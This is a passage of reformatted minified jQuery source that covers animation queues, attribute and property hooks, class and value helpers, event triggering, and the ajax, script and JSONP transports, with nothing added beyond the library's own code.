              r = H.get(this);
            if (s) r[s] && r[s].stop && n(r[s]);
            else for (s in r) r[s] && r[s].stop && Ut.test(s) && n(r[s]);
            for (s = o.length; s--; )
              o[s].elem !== this ||
                (null != t && o[s].queue !== t) ||
                (o[s].anim.stop(i), (e = !1), o.splice(s, 1));
            (!e && i) || p.dequeue(this, t);
          })
        );
      },
      finish: function (t) {
        return (
          !1 !== t && (t = t || "fx"),
          this.each(function () {
            var e,
              i = H.get(this),
              n = i[t + "queue"],
              s = i[t + "queueHooks"],
              o = p.timers,
              r = n ? n.length : 0;
            for (
              i.finish = !0,
                p.queue(this, t, []),
                s && s.stop && s.stop.call(this, !0),
                e = o.length;
              e--;

            )
              o[e].elem === this &&
                o[e].queue === t &&
                (o[e].anim.stop(!0), o.splice(e, 1));
            for (e = 0; r > e; e++)
              n[e] && n[e].finish && n[e].finish.call(this);
            delete i.finish;
          })
        );
      },
    }),
    p.each(["toggle", "show", "hide"], function (t, e) {
      var i = p.fn[e];
      p.fn[e] = function (t, n, s) {
        return null == t || "boolean" == typeof t
          ? i.apply(this, arguments)
          : this.animate(Qt(e, !0), t, n, s);
      };
    }),
    p.each(
      {
        slideDown: Qt("show"),
        slideUp: Qt("hide"),
        slideToggle: Qt("toggle"),
        fadeIn: { opacity: "show" },
        fadeOut: { opacity: "hide" },
        fadeToggle: { opacity: "toggle" },
      },
      function (t, e) {
        p.fn[t] = function (t, i, n) {
          return this.animate(e, t, i, n);
        };
      }
    ),
    (p.timers = []),
    (p.fx.tick = function () {
      var t,
        e = 0,
        i = p.timers;
      for (Rt = p.now(); e < i.length; e++)
        (t = i[e])() || i[e] !== t || i.splice(e--, 1);
      i.length || p.fx.stop(), (Rt = void 0);
    }),
    (p.fx.timer = function (t) {
      p.timers.push(t), t() ? p.fx.start() : p.timers.pop();
    }),
    (p.fx.interval = 13),
    (p.fx.start = function () {
      qt || (qt = t.setInterval(p.fx.tick, p.fx.interval));
    }),
    (p.fx.stop = function () {
      t.clearInterval(qt), (qt = null);
    }),
    (p.fx.speeds = { slow: 600, fast: 200, _default: 400 }),
    (p.fn.delay = function (e, i) {
      return (
        (e = (p.fx && p.fx.speeds[e]) || e),
        (i = i || "fx"),
        this.queue(i, function (i, n) {
          var s = t.setTimeout(i, e);
          n.stop = function () {
            t.clearTimeout(s);
          };
        })
      );
    }),
    (function () {
      var t = n.createElement("input"),
        e = n.createElement("select"),
        i = e.appendChild(n.createElement("option"));
      (t.type = "checkbox"),
        (d.checkOn = "" !== t.value),
        (d.optSelected = i.selected),
        (e.disabled = !0),
        (d.optDisabled = !i.disabled),
        ((t = n.createElement("input")).value = "t"),
        (t.type = "radio"),
        (d.radioValue = "t" === t.value);
    })();
  var Xt,
    Zt = p.expr.attrHandle;
  p.fn.extend({
    attr: function (t, e) {
      return P(this, p.attr, t, e, arguments.length > 1);
    },
    removeAttr: function (t) {
      return this.each(function () {
        p.removeAttr(this, t);
      });
    },
  }),
    p.extend({
      attr: function (t, e, i) {
        var n,
          s,
          o = t.nodeType;
        if (3 !== o && 8 !== o && 2 !== o)
          return void 0 === t.getAttribute
            ? p.prop(t, e, i)
            : ((1 === o && p.isXMLDoc(t)) ||
                ((e = e.toLowerCase()),
                (s =
                  p.attrHooks[e] || (p.expr.match.bool.test(e) ? Xt : void 0))),
              void 0 !== i
                ? null === i
                  ? void p.removeAttr(t, e)
                  : s && "set" in s && void 0 !== (n = s.set(t, i, e))
                  ? n
                  : (t.setAttribute(e, i + ""), i)
                : s && "get" in s && null !== (n = s.get(t, e))
                ? n
                : null == (n = p.find.attr(t, e))
                ? void 0
                : n);
      },
      attrHooks: {
        type: {
          set: function (t, e) {
            if (!d.radioValue && "radio" === e && p.nodeName(t, "input")) {
              var i = t.value;
              return t.setAttribute("type", e), i && (t.value = i), e;
            }
          },
        },
      },
      removeAttr: function (t, e) {
        var i,
          n,
          s = 0,
          o = e && e.match(O);
        if (o && 1 === t.nodeType)
          for (; (i = o[s++]); )
            (n = p.propFix[i] || i),
              p.expr.match.bool.test(i) && (t[n] = !1),
              t.removeAttribute(i);
      },
    }),
    (Xt = {
      set: function (t, e, i) {
        return !1 === e ? p.removeAttr(t, i) : t.setAttribute(i, i), i;
      },
    }),
    p.each(p.expr.match.bool.source.match(/\w+/g), function (t, e) {
      var i = Zt[e] || p.find.attr;
      Zt[e] = function (t, e, n) {
        var s, o;
        return (
          n ||
            ((o = Zt[e]),
            (Zt[e] = s),
            (s = null != i(t, e, n) ? e.toLowerCase() : null),
            (Zt[e] = o)),
          s
        );
      };
    });
  var Gt = /^(?:input|select|textarea|button)$/i,
    Jt = /^(?:a|area)$/i;
  p.fn.extend({
    prop: function (t, e) {
      return P(this, p.prop, t, e, arguments.length > 1);
    },
    removeProp: function (t) {
      return this.each(function () {
        delete this[p.propFix[t] || t];
      });
    },
  }),
    p.extend({
      prop: function (t, e, i) {
        var n,
          s,
          o = t.nodeType;
        if (3 !== o && 8 !== o && 2 !== o)
          return (
            (1 === o && p.isXMLDoc(t)) ||
              ((e = p.propFix[e] || e), (s = p.propHooks[e])),
            void 0 !== i
              ? s && "set" in s && void 0 !== (n = s.set(t, i, e))
                ? n
                : (t[e] = i)
              : s && "get" in s && null !== (n = s.get(t, e))
              ? n
              : t[e]
          );
      },
      propHooks: {
        tabIndex: {
          get: function (t) {
            var e = p.find.attr(t, "tabindex");
            return e
              ? parseInt(e, 10)
              : Gt.test(t.nodeName) || (Jt.test(t.nodeName) && t.href)
              ? 0
              : -1;
          },
        },
      },
      propFix: { for: "htmlFor", class: "className" },
    }),
    d.optSelected ||
      (p.propHooks.selected = {
        get: function (t) {
          var e = t.parentNode;
          return e && e.parentNode && e.parentNode.selectedIndex, null;
        },
        set: function (t) {
          var e = t.parentNode;
          e && (e.selectedIndex, e.parentNode && e.parentNode.selectedIndex);
        },
      }),
    p.each(
      [
        "tabIndex",
        "readOnly",
        "maxLength",
        "cellSpacing",
        "cellPadding",
        "rowSpan",
        "colSpan",
        "useMap",
        "frameBorder",
        "contentEditable",
      ],
      function () {
        p.propFix[this.toLowerCase()] = this;
      }
    );
  var te = /[\t\r\n\f]/g;
  function ee(t) {
    return (t.getAttribute && t.getAttribute("class")) || "";
  }
  p.fn.extend({
    addClass: function (t) {
      var e,
        i,
        n,
        s,
        o,
        r,
        a,
        l = 0;
      if (p.isFunction(t))
        return this.each(function (e) {
          p(this).addClass(t.call(this, e, ee(this)));
        });
      if ("string" == typeof t && t)
        for (e = t.match(O) || []; (i = this[l++]); )
          if (
            ((s = ee(i)),
            (n = 1 === i.nodeType && (" " + s + " ").replace(te, " ")))
          ) {
            for (r = 0; (o = e[r++]); )
              n.indexOf(" " + o + " ") < 0 && (n += o + " ");
            s !== (a = p.trim(n)) && i.setAttribute("class", a);
          }
      return this;
    },
    removeClass: function (t) {
      var e,
        i,
        n,
        s,
        o,
        r,
        a,
        l = 0;
      if (p.isFunction(t))
        return this.each(function (e) {
          p(this).removeClass(t.call(this, e, ee(this)));
        });
      if (!arguments.length) return this.attr("class", "");
      if ("string" == typeof t && t)
        for (e = t.match(O) || []; (i = this[l++]); )
          if (
            ((s = ee(i)),
            (n = 1 === i.nodeType && (" " + s + " ").replace(te, " ")))
          ) {
            for (r = 0; (o = e[r++]); )
              for (; n.indexOf(" " + o + " ") > -1; )
                n = n.replace(" " + o + " ", " ");
            s !== (a = p.trim(n)) && i.setAttribute("class", a);
          }
      return this;
    },
    toggleClass: function (t, e) {
      var i = typeof t;
      return "boolean" == typeof e && "string" === i
        ? e
          ? this.addClass(t)
          : this.removeClass(t)
        : p.isFunction(t)
        ? this.each(function (i) {
            p(this).toggleClass(t.call(this, i, ee(this), e), e);
          })
        : this.each(function () {
            var e, n, s, o;
            if ("string" === i)
              for (n = 0, s = p(this), o = t.match(O) || []; (e = o[n++]); )
                s.hasClass(e) ? s.removeClass(e) : s.addClass(e);
            else
              (void 0 !== t && "boolean" !== i) ||
                ((e = ee(this)) && H.set(this, "__className__", e),
                this.setAttribute &&
                  this.setAttribute(
                    "class",
                    e || !1 === t ? "" : H.get(this, "__className__") || ""
                  ));
          });
    },
    hasClass: function (t) {
      var e,
        i,
        n = 0;
      for (e = " " + t + " "; (i = this[n++]); )
        if (
          1 === i.nodeType &&
          (" " + ee(i) + " ").replace(te, " ").indexOf(e) > -1
        )
          return !0;
      return !1;
    },
  });
  var ie = /\r/g,
    ne = /[\x20\t\r\n\f]+/g;
  p.fn.extend({
    val: function (t) {
      var e,
        i,
        n,
        s = this[0];
      return arguments.length
        ? ((n = p.isFunction(t)),
          this.each(function (i) {
            var s;
            1 === this.nodeType &&
              (null == (s = n ? t.call(this, i, p(this).val()) : t)
                ? (s = "")
                : "number" == typeof s
                ? (s += "")
                : p.isArray(s) &&
                  (s = p.map(s, function (t) {
                    return null == t ? "" : t + "";
                  })),
              ((e =
                p.valHooks[this.type] ||
                p.valHooks[this.nodeName.toLowerCase()]) &&
                "set" in e &&
                void 0 !== e.set(this, s, "value")) ||
                (this.value = s));
          }))
        : s
        ? (e = p.valHooks[s.type] || p.valHooks[s.nodeName.toLowerCase()]) &&
          "get" in e &&
          void 0 !== (i = e.get(s, "value"))
          ? i
          : "string" == typeof (i = s.value)
          ? i.replace(ie, "")
          : null == i
          ? ""
          : i
        : void 0;
    },
  }),
    p.extend({
      valHooks: {
        option: {
          get: function (t) {
            var e = p.find.attr(t, "value");
            return null != e ? e : p.trim(p.text(t)).replace(ne, " ");
          },
        },
        select: {
          get: function (t) {
            for (
              var e,
                i,
                n = t.options,
                s = t.selectedIndex,
                o = "select-one" === t.type || 0 > s,
                r = o ? null : [],
                a = o ? s + 1 : n.length,
                l = 0 > s ? a : o ? s : 0;
              a > l;
              l++
            )
              if (
                ((i = n[l]).selected || l === s) &&
                (d.optDisabled
                  ? !i.disabled
                  : null === i.getAttribute("disabled")) &&
                (!i.parentNode.disabled ||
                  !p.nodeName(i.parentNode, "optgroup"))
              ) {
                if (((e = p(i).val()), o)) return e;
                r.push(e);
              }
            return r;
          },
          set: function (t, e) {
            for (
              var i, n, s = t.options, o = p.makeArray(e), r = s.length;
              r--;

            )
              ((n = s[r]).selected =
                p.inArray(p.valHooks.option.get(n), o) > -1) && (i = !0);
            return i || (t.selectedIndex = -1), o;
          },
        },
      },
    }),
    p.each(["radio", "checkbox"], function () {
      (p.valHooks[this] = {
        set: function (t, e) {
          return p.isArray(e)
            ? (t.checked = p.inArray(p(t).val(), e) > -1)
            : void 0;
        },
      }),
        d.checkOn ||
          (p.valHooks[this].get = function (t) {
            return null === t.getAttribute("value") ? "on" : t.value;
          });
    });
  var se = /^(?:focusinfocus|focusoutblur)$/;
  p.extend(p.event, {
    trigger: function (e, i, s, o) {
      var r,
        a,
        l,
        c,
        d,
        h,
        f,
        g = [s || n],
        m = u.call(e, "type") ? e.type : e,
        v = u.call(e, "namespace") ? e.namespace.split(".") : [];
      if (
        ((a = l = s = s || n),
        3 !== s.nodeType &&
          8 !== s.nodeType &&
          !se.test(m + p.event.triggered) &&
          (m.indexOf(".") > -1 &&
            ((v = m.split(".")), (m = v.shift()), v.sort()),
          (d = m.indexOf(":") < 0 && "on" + m),
          ((e = e[p.expando]
            ? e
            : new p.Event(m, "object" == typeof e && e)).isTrigger = o ? 2 : 3),
          (e.namespace = v.join(".")),
          (e.rnamespace = e.namespace
            ? new RegExp("(^|\\.)" + v.join("\\.(?:.*\\.|)") + "(\\.|$)")
            : null),
          (e.result = void 0),
          e.target || (e.target = s),
          (i = null == i ? [e] : p.makeArray(i, [e])),
          (f = p.event.special[m] || {}),
          o || !f.trigger || !1 !== f.trigger.apply(s, i)))
      ) {
        if (!o && !f.noBubble && !p.isWindow(s)) {
          for (
            c = f.delegateType || m, se.test(c + m) || (a = a.parentNode);
            a;
            a = a.parentNode
          )
            g.push(a), (l = a);
          l === (s.ownerDocument || n) &&
            g.push(l.defaultView || l.parentWindow || t);
        }
        for (r = 0; (a = g[r++]) && !e.isPropagationStopped(); )
          (e.type = r > 1 ? c : f.bindType || m),
            (h = (H.get(a, "events") || {})[e.type] && H.get(a, "handle")) &&
              h.apply(a, i),
            (h = d && a[d]) &&
              h.apply &&
              M(a) &&
              ((e.result = h.apply(a, i)),
              !1 === e.result && e.preventDefault());
        return (
          (e.type = m),
          o ||
            e.isDefaultPrevented() ||
            (f._default && !1 !== f._default.apply(g.pop(), i)) ||
            !M(s) ||
            (d &&
              p.isFunction(s[m]) &&
              !p.isWindow(s) &&
              ((l = s[d]) && (s[d] = null),
              (p.event.triggered = m),
              s[m](),
              (p.event.triggered = void 0),
              l && (s[d] = l))),
          e.result
        );
      }
    },
    simulate: function (t, e, i) {
      var n = p.extend(new p.Event(), i, { type: t, isSimulated: !0 });
      p.event.trigger(n, null, e);
    },
  }),
    p.fn.extend({
      trigger: function (t, e) {
        return this.each(function () {
          p.event.trigger(t, e, this);
        });
      },
      triggerHandler: function (t, e) {
        var i = this[0];
        return i ? p.event.trigger(t, e, i, !0) : void 0;
      },
    }),
    p.each(
      "blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(
        " "
      ),
      function (t, e) {
        p.fn[e] = function (t, i) {
          return arguments.length > 0
            ? this.on(e, null, t, i)
            : this.trigger(e);
        };
      }
    ),
    p.fn.extend({
      hover: function (t, e) {
        return this.mouseenter(t).mouseleave(e || t);
      },
    }),
    (d.focusin = "onfocusin" in t),
    d.focusin ||
      p.each({ focus: "focusin", blur: "focusout" }, function (t, e) {
        var i = function (t) {
          p.event.simulate(e, t.target, p.event.fix(t));
        };
        p.event.special[e] = {
          setup: function () {
            var n = this.ownerDocument || this,
              s = H.access(n, e);
            s || n.addEventListener(t, i, !0), H.access(n, e, (s || 0) + 1);
          },
          teardown: function () {
            var n = this.ownerDocument || this,
              s = H.access(n, e) - 1;
            s
              ? H.access(n, e, s)
              : (n.removeEventListener(t, i, !0), H.remove(n, e));
          },
        };
      });
  var oe = t.location,
    re = p.now(),
    ae = /\?/;
  (p.parseJSON = function (t) {
    return JSON.parse(t + "");
  }),
    (p.parseXML = function (e) {
      var i;
      if (!e || "string" != typeof e) return null;
      try {
        i = new t.DOMParser().parseFromString(e, "text/xml");
      } catch (t) {
        i = void 0;
      }
      return (
        (i && !i.getElementsByTagName("parsererror").length) ||
          p.error("Invalid XML: " + e),
        i
      );
    });
  var le = /#.*$/,
    ce = /([?&])_=[^&]*/,
    ue = /^(.*?):[ \t]*([^\r\n]*)$/gm,
    de = /^(?:GET|HEAD)$/,
    he = /^\/\//,
    pe = {},
    fe = {},
    ge = "*/".concat("*"),
    me = n.createElement("a");
  function ve(t) {
    return function (e, i) {
      "string" != typeof e && ((i = e), (e = "*"));
      var n,
        s = 0,
        o = e.toLowerCase().match(O) || [];
      if (p.isFunction(i))
        for (; (n = o[s++]); )
          "+" === n[0]
            ? ((n = n.slice(1) || "*"), (t[n] = t[n] || []).unshift(i))
            : (t[n] = t[n] || []).push(i);
    };
  }
  function ye(t, e, i, n) {
    var s = {},
      o = t === fe;
    function r(a) {
      var l;
      return (
        (s[a] = !0),
        p.each(t[a] || [], function (t, a) {
          var c = a(e, i, n);
          return "string" != typeof c || o || s[c]
            ? o
              ? !(l = c)
              : void 0
            : (e.dataTypes.unshift(c), r(c), !1);
        }),
        l
      );
    }
    return r(e.dataTypes[0]) || (!s["*"] && r("*"));
  }
  function _e(t, e) {
    var i,
      n,
      s = p.ajaxSettings.flatOptions || {};
    for (i in e) void 0 !== e[i] && ((s[i] ? t : n || (n = {}))[i] = e[i]);
    return n && p.extend(!0, t, n), t;
  }
  (me.href = oe.href),
    p.extend({
      active: 0,
      lastModified: {},
      etag: {},
      ajaxSettings: {
        url: oe.href,
        type: "GET",
        isLocal:
          /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(
            oe.protocol
          ),
        global: !0,
        processData: !0,
        async: !0,
        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
        accepts: {
          "*": ge,
          text: "text/plain",
          html: "text/html",
          xml: "application/xml, text/xml",
          json: "application/json, text/javascript",
        },
        contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ },
        responseFields: {
          xml: "responseXML",
          text: "responseText",
          json: "responseJSON",
        },
        converters: {
          "* text": String,
          "text html": !0,
          "text json": p.parseJSON,
          "text xml": p.parseXML,
        },
        flatOptions: { url: !0, context: !0 },
      },
      ajaxSetup: function (t, e) {
        return e ? _e(_e(t, p.ajaxSettings), e) : _e(p.ajaxSettings, t);
      },
      ajaxPrefilter: ve(pe),
      ajaxTransport: ve(fe),
      ajax: function (e, i) {
        "object" == typeof e && ((i = e), (e = void 0)), (i = i || {});
        var s,
          o,
          r,
          a,
          l,
          c,
          u,
          d,
          h = p.ajaxSetup({}, i),
          f = h.context || h,
          g = h.context && (f.nodeType || f.jquery) ? p(f) : p.event,
          m = p.Deferred(),
          v = p.Callbacks("once memory"),
          y = h.statusCode || {},
          _ = {},
          w = {},
          b = 0,
          C = "canceled",
          x = {
            readyState: 0,
            getResponseHeader: function (t) {
              var e;
              if (2 === b) {
                if (!a)
                  for (a = {}; (e = ue.exec(r)); ) a[e[1].toLowerCase()] = e[2];
                e = a[t.toLowerCase()];
              }
              return null == e ? null : e;
            },
            getAllResponseHeaders: function () {
              return 2 === b ? r : null;
            },
            setRequestHeader: function (t, e) {
              var i = t.toLowerCase();
              return b || ((t = w[i] = w[i] || t), (_[t] = e)), this;
            },
            overrideMimeType: function (t) {
              return b || (h.mimeType = t), this;
            },
            statusCode: function (t) {
              var e;
              if (t)
                if (2 > b) for (e in t) y[e] = [y[e], t[e]];
                else x.always(t[x.status]);
              return this;
            },
            abort: function (t) {
              var e = t || C;
              return s && s.abort(e), T(0, e), this;
            },
          };
        if (
          ((m.promise(x).complete = v.add),
          (x.success = x.done),
          (x.error = x.fail),
          (h.url = ((e || h.url || oe.href) + "")
            .replace(le, "")
            .replace(he, oe.protocol + "//")),
          (h.type = i.method || i.type || h.method || h.type),
          (h.dataTypes = p
            .trim(h.dataType || "*")
            .toLowerCase()
            .match(O) || [""]),
          null == h.crossDomain)
        ) {
          c = n.createElement("a");
          try {
            (c.href = h.url),
              (c.href = c.href),
              (h.crossDomain =
                me.protocol + "//" + me.host != c.protocol + "//" + c.host);
          } catch (t) {
            h.crossDomain = !0;
          }
        }
        if (
          (h.data &&
            h.processData &&
            "string" != typeof h.data &&
            (h.data = p.param(h.data, h.traditional)),
          ye(pe, h, i, x),
          2 === b)
        )
          return x;
        for (d in ((u = p.event && h.global) &&
          0 == p.active++ &&
          p.event.trigger("ajaxStart"),
        (h.type = h.type.toUpperCase()),
        (h.hasContent = !de.test(h.type)),
        (o = h.url),
        h.hasContent ||
          (h.data &&
            ((o = h.url += (ae.test(o) ? "&" : "?") + h.data), delete h.data),
          !1 === h.cache &&
            (h.url = ce.test(o)
              ? o.replace(ce, "$1_=" + re++)
              : o + (ae.test(o) ? "&" : "?") + "_=" + re++)),
        h.ifModified &&
          (p.lastModified[o] &&
            x.setRequestHeader("If-Modified-Since", p.lastModified[o]),
          p.etag[o] && x.setRequestHeader("If-None-Match", p.etag[o])),
        ((h.data && h.hasContent && !1 !== h.contentType) || i.contentType) &&
          x.setRequestHeader("Content-Type", h.contentType),
        x.setRequestHeader(
          "Accept",
          h.dataTypes[0] && h.accepts[h.dataTypes[0]]
            ? h.accepts[h.dataTypes[0]] +
                ("*" !== h.dataTypes[0] ? ", " + ge + "; q=0.01" : "")
            : h.accepts["*"]
        ),
        h.headers))
          x.setRequestHeader(d, h.headers[d]);
        if (h.beforeSend && (!1 === h.beforeSend.call(f, x, h) || 2 === b))
          return x.abort();
        for (d in ((C = "abort"), { success: 1, error: 1, complete: 1 }))
          x[d](h[d]);
        if ((s = ye(fe, h, i, x))) {
          if (((x.readyState = 1), u && g.trigger("ajaxSend", [x, h]), 2 === b))
            return x;
          h.async &&
            h.timeout > 0 &&
            (l = t.setTimeout(function () {
              x.abort("timeout");
            }, h.timeout));
          try {
            (b = 1), s.send(_, T);
          } catch (t) {
            if (!(2 > b)) throw t;
            T(-1, t);
          }
        } else T(-1, "No Transport");
        function T(e, i, n, a) {
          var c,
            d,
            _,
            w,
            C,
            T = i;
          2 !== b &&
            ((b = 2),
            l && t.clearTimeout(l),
            (s = void 0),
            (r = a || ""),
            (x.readyState = e > 0 ? 4 : 0),
            (c = (e >= 200 && 300 > e) || 304 === e),
            n &&
              (w = (function (t, e, i) {
                for (
                  var n, s, o, r, a = t.contents, l = t.dataTypes;
                  "*" === l[0];

                )
                  l.shift(),
                    void 0 === n &&
                      (n = t.mimeType || e.getResponseHeader("Content-Type"));
                if (n)
                  for (s in a)
                    if (a[s] && a[s].test(n)) {
                      l.unshift(s);
                      break;
                    }
                if (l[0] in i) o = l[0];
                else {
                  for (s in i) {
                    if (!l[0] || t.converters[s + " " + l[0]]) {
                      o = s;
                      break;
                    }
                    r || (r = s);
                  }
                  o = o || r;
                }
                return o ? (o !== l[0] && l.unshift(o), i[o]) : void 0;
              })(h, x, n)),
            (w = (function (t, e, i, n) {
              var s,
                o,
                r,
                a,
                l,
                c = {},
                u = t.dataTypes.slice();
              if (u[1])
                for (r in t.converters) c[r.toLowerCase()] = t.converters[r];
              for (o = u.shift(); o; )
                if (
                  (t.responseFields[o] && (i[t.responseFields[o]] = e),
                  !l && n && t.dataFilter && (e = t.dataFilter(e, t.dataType)),
                  (l = o),
                  (o = u.shift()))
                )
                  if ("*" === o) o = l;
                  else if ("*" !== l && l !== o) {
                    if (!(r = c[l + " " + o] || c["* " + o]))
                      for (s in c)
                        if (
                          (a = s.split(" "))[1] === o &&
                          (r = c[l + " " + a[0]] || c["* " + a[0]])
                        ) {
                          !0 === r
                            ? (r = c[s])
                            : !0 !== c[s] && ((o = a[0]), u.unshift(a[1]));
                          break;
                        }
                    if (!0 !== r)
                      if (r && t.throws) e = r(e);
                      else
                        try {
                          e = r(e);
                        } catch (t) {
                          return {
                            state: "parsererror",
                            error: r
                              ? t
                              : "No conversion from " + l + " to " + o,
                          };
                        }
                  }
              return { state: "success", data: e };
            })(h, w, x, c)),
            c
              ? (h.ifModified &&
                  ((C = x.getResponseHeader("Last-Modified")) &&
                    (p.lastModified[o] = C),
                  (C = x.getResponseHeader("etag")) && (p.etag[o] = C)),
                204 === e || "HEAD" === h.type
                  ? (T = "nocontent")
                  : 304 === e
                  ? (T = "notmodified")
                  : ((T = w.state), (d = w.data), (c = !(_ = w.error))))
              : ((_ = T), (!e && T) || ((T = "error"), 0 > e && (e = 0))),
            (x.status = e),
            (x.statusText = (i || T) + ""),
            c ? m.resolveWith(f, [d, T, x]) : m.rejectWith(f, [x, T, _]),
            x.statusCode(y),
            (y = void 0),
            u && g.trigger(c ? "ajaxSuccess" : "ajaxError", [x, h, c ? d : _]),
            v.fireWith(f, [x, T]),
            u &&
              (g.trigger("ajaxComplete", [x, h]),
              --p.active || p.event.trigger("ajaxStop")));
        }
        return x;
      },
      getJSON: function (t, e, i) {
        return p.get(t, e, i, "json");
      },
      getScript: function (t, e) {
        return p.get(t, void 0, e, "script");
      },
    }),
    p.each(["get", "post"], function (t, e) {
      p[e] = function (t, i, n, s) {
        return (
          p.isFunction(i) && ((s = s || n), (n = i), (i = void 0)),
          p.ajax(
            p.extend(
              { url: t, type: e, dataType: s, data: i, success: n },
              p.isPlainObject(t) && t
            )
          )
        );
      };
    }),
    (p._evalUrl = function (t) {
      return p.ajax({
        url: t,
        type: "GET",
        dataType: "script",
        async: !1,
        global: !1,
        throws: !0,
      });
    }),
    p.fn.extend({
      wrapAll: function (t) {
        var e;
        return p.isFunction(t)
          ? this.each(function (e) {
              p(this).wrapAll(t.call(this, e));
            })
          : (this[0] &&
              ((e = p(t, this[0].ownerDocument).eq(0).clone(!0)),
              this[0].parentNode && e.insertBefore(this[0]),
              e
                .map(function () {
                  for (var t = this; t.firstElementChild; )
                    t = t.firstElementChild;
                  return t;
                })
                .append(this)),
            this);
      },
      wrapInner: function (t) {
        return p.isFunction(t)
          ? this.each(function (e) {
              p(this).wrapInner(t.call(this, e));
            })
          : this.each(function () {
              var e = p(this),
                i = e.contents();
              i.length ? i.wrapAll(t) : e.append(t);
            });
      },
      wrap: function (t) {
        var e = p.isFunction(t);
        return this.each(function (i) {
          p(this).wrapAll(e ? t.call(this, i) : t);
        });
      },
      unwrap: function () {
        return this.parent()
          .each(function () {
            p.nodeName(this, "body") || p(this).replaceWith(this.childNodes);
          })
          .end();
      },
    }),
    (p.expr.filters.hidden = function (t) {
      return !p.expr.filters.visible(t);
    }),
    (p.expr.filters.visible = function (t) {
      return (
        t.offsetWidth > 0 || t.offsetHeight > 0 || t.getClientRects().length > 0
      );
    });
  var we = /%20/g,
    be = /\[\]$/,
    Ce = /\r?\n/g,
    xe = /^(?:submit|button|image|reset|file)$/i,
    Te = /^(?:input|select|textarea|keygen)/i;
  function ke(t, e, i, n) {
    var s;
    if (p.isArray(e))
      p.each(e, function (e, s) {
        i || be.test(t)
          ? n(t, s)
          : ke(
              t + "[" + ("object" == typeof s && null != s ? e : "") + "]",
              s,
              i,
              n
            );
      });
    else if (i || "object" !== p.type(e)) n(t, e);
    else for (s in e) ke(t + "[" + s + "]", e[s], i, n);
  }
  (p.param = function (t, e) {
    var i,
      n = [],
      s = function (t, e) {
        (e = p.isFunction(e) ? e() : null == e ? "" : e),
          (n[n.length] = encodeURIComponent(t) + "=" + encodeURIComponent(e));
      };
    if (
      (void 0 === e && (e = p.ajaxSettings && p.ajaxSettings.traditional),
      p.isArray(t) || (t.jquery && !p.isPlainObject(t)))
    )
      p.each(t, function () {
        s(this.name, this.value);
      });
    else for (i in t) ke(i, t[i], e, s);
    return n.join("&").replace(we, "+");
  }),
    p.fn.extend({
      serialize: function () {
        return p.param(this.serializeArray());
      },
      serializeArray: function () {
        return this.map(function () {
          var t = p.prop(this, "elements");
          return t ? p.makeArray(t) : this;
        })
          .filter(function () {
            var t = this.type;
            return (
              this.name &&
              !p(this).is(":disabled") &&
              Te.test(this.nodeName) &&
              !xe.test(t) &&
              (this.checked || !Q.test(t))
            );
          })
          .map(function (t, e) {
            var i = p(this).val();
            return null == i
              ? null
              : p.isArray(i)
              ? p.map(i, function (t) {
                  return { name: e.name, value: t.replace(Ce, "\r\n") };
                })
              : { name: e.name, value: i.replace(Ce, "\r\n") };
          })
          .get();
      },
    }),
    (p.ajaxSettings.xhr = function () {
      try {
        return new t.XMLHttpRequest();
      } catch (t) {}
    });
  var Se = { 0: 200, 1223: 204 },
    Ee = p.ajaxSettings.xhr();
  (d.cors = !!Ee && "withCredentials" in Ee),
    (d.ajax = Ee = !!Ee),
    p.ajaxTransport(function (e) {
      var i, n;
      return d.cors || (Ee && !e.crossDomain)
        ? {
            send: function (s, o) {
              var r,
                a = e.xhr();
              if (
                (a.open(e.type, e.url, e.async, e.username, e.password),
                e.xhrFields)
              )
                for (r in e.xhrFields) a[r] = e.xhrFields[r];
              for (r in (e.mimeType &&
                a.overrideMimeType &&
                a.overrideMimeType(e.mimeType),
              e.crossDomain ||
                s["X-Requested-With"] ||
                (s["X-Requested-With"] = "XMLHttpRequest"),
              s))
                a.setRequestHeader(r, s[r]);
              (i = function (t) {
                return function () {
                  i &&
                    ((i =
                      n =
                      a.onload =
                      a.onerror =
                      a.onabort =
                      a.onreadystatechange =
                        null),
                    "abort" === t
                      ? a.abort()
                      : "error" === t
                      ? "number" != typeof a.status
                        ? o(0, "error")
                        : o(a.status, a.statusText)
                      : o(
                          Se[a.status] || a.status,
                          a.statusText,
                          "text" !== (a.responseType || "text") ||
                            "string" != typeof a.responseText
                            ? { binary: a.response }
                            : { text: a.responseText },
                          a.getAllResponseHeaders()
                        ));
                };
              }),
                (a.onload = i()),
                (n = a.onerror = i("error")),
                void 0 !== a.onabort
                  ? (a.onabort = n)
                  : (a.onreadystatechange = function () {
                      4 === a.readyState &&
                        t.setTimeout(function () {
                          i && n();
                        });
                    }),
                (i = i("abort"));
              try {
                a.send((e.hasContent && e.data) || null);
              } catch (t) {
                if (i) throw t;
              }
            },
            abort: function () {
              i && i();
            },
          }
        : void 0;
    }),
    p.ajaxSetup({
      accepts: {
        script:
          "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
      },
      contents: { script: /\b(?:java|ecma)script\b/ },
      converters: {
        "text script": function (t) {
          return p.globalEval(t), t;
        },
      },
    }),
    p.ajaxPrefilter("script", function (t) {
      void 0 === t.cache && (t.cache = !1), t.crossDomain && (t.type = "GET");
    }),
    p.ajaxTransport("script", function (t) {
      var e, i;
      if (t.crossDomain)
        return {
          send: function (s, o) {
            (e = p("<script>")
              .prop({ charset: t.scriptCharset, src: t.url })
              .on(
                "load error",
                (i = function (t) {
                  e.remove(),
                    (i = null),
                    t && o("error" === t.type ? 404 : 200, t.type);
                })
              )),
              n.head.appendChild(e[0]);
          },
          abort: function () {
            i && i();
          },
        };
    });
  var Ae = [],
    De = /(=)\?(?=&|$)|\?\?/;
  p.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function () {
      var t = Ae.pop() || p.expando + "_" + re++;
      return (this[t] = !0), t;
    },
  }),
    p.ajaxPrefilter("json jsonp", function (e, i, n) {
      var s,
        o,
        r,
        a =
          !1 !== e.jsonp &&
          (De.test(e.url)
            ? "url"
            : "string" == typeof e.data &&
              0 ===
                (e.contentType || "").indexOf(
                  "application/x-www-form-urlencoded"
                ) &&
              De.test(e.data) &&
              "data");
      return a || "jsonp" === e.dataTypes[0]
        ? ((s = e.jsonpCallback =
            p.isFunction(e.jsonpCallback)
              ? e.jsonpCallback()
              : e.jsonpCallback),
          a
